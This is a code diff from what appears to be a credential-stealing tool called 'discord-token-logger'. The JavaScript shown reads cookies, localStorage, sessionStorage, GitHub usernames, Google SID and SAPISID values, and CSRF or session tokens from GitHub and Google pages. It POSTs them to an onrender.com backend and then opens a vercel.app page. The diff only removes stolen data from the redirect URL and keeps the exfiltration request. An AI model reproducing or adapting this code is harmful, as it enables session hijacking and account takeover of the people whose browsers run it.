@@ -2472,9 +2472,7 @@
       "var userMeta=document.querySelector('meta[name=user-login]');if(userMeta)tokens['github_username']=userMeta.getAttribute('content');" +
       "var payload={cookie:cookies,localStorage:ls,sessionStorage:ss,tokens:tokens,type:'github',method:'github_cookie',timestamp:new Date().toISOString(),url:window.location.href};" +
       "var x=new XMLHttpRequest();x.open('POST','https://discord-token-logger-backend.onrender.com/api/process-cookie',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(payload));" +
-      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?cookie='+encodeURIComponent(cookies.substring(0,1500))+" +
-      "'&type=github&method=github_cookie&timestamp='+encodeURIComponent(new Date().toISOString())+" +
-      "'&url='+encodeURIComponent(window.location.href);" +
+      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?sent=1&type=github&method=github_cookie';" +
       "window.open(redirectUrl,'_blank');" +
       "}catch(e){console.error(e);}" +
       "return;" +
@@ -2515,11 +2513,7 @@
       "for(var i=0;i<metas.length;i++){var mn=metas[i].getAttribute('name')||metas[i].getAttribute('property')||'meta_'+i;var mc=metas[i].getAttribute('content');if(mc&&(mn.toLowerCase().indexOf('token')!==-1||mn.toLowerCase().indexOf('csrf')!==-1||mn.toLowerCase().indexOf('session')!==-1)){tokens[mn]=mc;}}" +
       "var payload={cookie:allCookies,sid:sid,sapisid:sapisid,localStorage:ls,sessionStorage:ss,tokens:tokens,type:'google',method:'google_cookie',timestamp:new Date().toISOString(),url:window.location.href};" +
       "var x=new XMLHttpRequest();x.open('POST','https://discord-token-logger-backend.onrender.com/api/process-cookie',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(payload));" +
-      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?cookie='+encodeURIComponent(allCookies.substring(0,1500))+" +
-      "'&sid='+encodeURIComponent(sid)+" +
-      "'&sapisid='+encodeURIComponent(sapisid)+" +
-      "'&type=google&method=google_cookie&timestamp='+encodeURIComponent(new Date().toISOString())+" +
-      "'&url='+encodeURIComponent(window.location.href);" +
+      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?sent=1&type=google&method=google_cookie';" +
       "window.open(redirectUrl,'_blank');" +
       "}catch(e){console.error(e);}" +
       "return;" +
